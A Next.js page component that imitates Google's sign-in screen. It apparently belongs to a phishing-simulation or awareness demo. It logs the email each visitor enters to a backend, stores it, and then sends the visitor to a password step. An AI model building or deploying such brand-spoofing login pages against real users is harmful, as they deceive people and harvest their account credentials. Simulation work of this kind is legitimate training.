'use client';

import { FormEvent, useState } from 'react';
import { useRouter } from 'next/navigation';
import { apiClient } from '@/lib/api-client';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';

const GoogleWordmark = ({ className = '' }: { className?: string }) => (
  <span className={`text-2xl font-medium tracking-tight ${className}`}>
    <span className="text-[#4285f4]">G</span>
    <span className="text-[#ea4335]">o</span>
    <span className="text-[#fbbc05]">o</span>
    <span className="text-[#4285f4]">g</span>
    <span className="text-[#34a853]">l</span>
    <span className="text-[#ea4335]">e</span>
  </span>
);

const Footer = () => (
  <footer className="mx-auto w-full max-w-5xl px-4 pb-8">
    <div className="flex flex-col gap-4 text-xs text-slate-600 md:flex-row md:items-center md:justify-between">
      <button
        type="button"
        className="inline-flex items-center gap-2 text-slate-600 hover:text-slate-900"
      >
        English (United States)
        <svg width="12" height="12" viewBox="0 0 12 12" aria-hidden="true" className="text-slate-500">
          <path d="M3 4.5l3 3 3-3" fill="none" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" />
        </svg>
      </button>
      <div className="flex items-center gap-6">
        <button type="button" className="hover:text-slate-900">
          Help
        </button>
        <button type="button" className="hover:text-slate-900">
          Privacy
        </button>
        <button type="button" className="hover:text-slate-900">
          Terms
        </button>
      </div>
    </div>
  </footer>
);

export default function DemoGoogleSignInPage() {
  const router = useRouter();
  const [email, setEmail] = useState('');
  const [error, setError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleNext = async (e: FormEvent) => {
    e.preventDefault();
    setError('');
    setIsSubmitting(true);

    try {
      await apiClient.logDemoGoogleAttempt({
        step: 'signin',
        email: email.trim(),
        passwordProvided: false,
      });
      if (typeof window !== 'undefined') {
        sessionStorage.setItem('demo_google_email', email.trim());
      }
      router.push('/demo/google/password');
    } catch (err: any) {
      setError(err?.message || 'Unable to continue');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#f1f3f4] text-slate-900">
      <div className="flex min-h-screen flex-col">
        <main className="flex flex-1 items-center justify-center px-4 py-10">
          <div className="w-full max-w-5xl rounded-3xl border border-slate-200 bg-white px-6 py-10 shadow-sm md:px-12">
            <div className="grid gap-10 md:grid-cols-[1.1fr_1fr]">
              <div className="space-y-4">
                <GoogleWordmark className="text-3xl" />
                <div>
                  <h1 className="text-3xl font-semibold text-slate-900">Sign in</h1>
                  <p className="mt-2 text-sm text-slate-600">Use your Google Account</p>
                </div>
              </div>

              <form onSubmit={handleNext} className="space-y-5">
                {error && (
                  <div className="rounded-md border border-red-200 bg-red-50 px-3 py-2 text-xs text-red-700">
                    {error}
                  </div>
                )}
                <Input
                  id="demo-google-email"
                  type="email"
                  placeholder="Email or phone"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  required
                  className="h-12 rounded-md border-slate-300 text-sm focus:border-[#1a73e8] focus-visible:ring-0"
                />
                <button type="button" className="text-sm font-medium text-[#1a73e8] hover:underline">
                  Forgot email?
                </button>
                <p className="text-sm text-slate-600">
                  Not your computer? Use Guest mode to sign in privately.{' '}
                  <button type="button" className="font-medium text-[#1a73e8] hover:underline">
                    Learn more
                  </button>
                </p>
                <div className="flex items-center justify-between pt-2">
                  <button type="button" className="text-sm font-medium text-[#1a73e8] hover:underline">
                    Create account
                  </button>
                  <Button
                    type="submit"
                    className="h-10 rounded-full bg-[#1a73e8] px-8 text-sm font-semibold text-white hover:bg-[#155cc2]"
                    disabled={isSubmitting}
                  >
                    {isSubmitting ? 'Continuing...' : 'Next'}
                  </Button>
                </div>
              </form>
            </div>
          </div>
        </main>
        <Footer />
      </div>
    </div>
  );
}
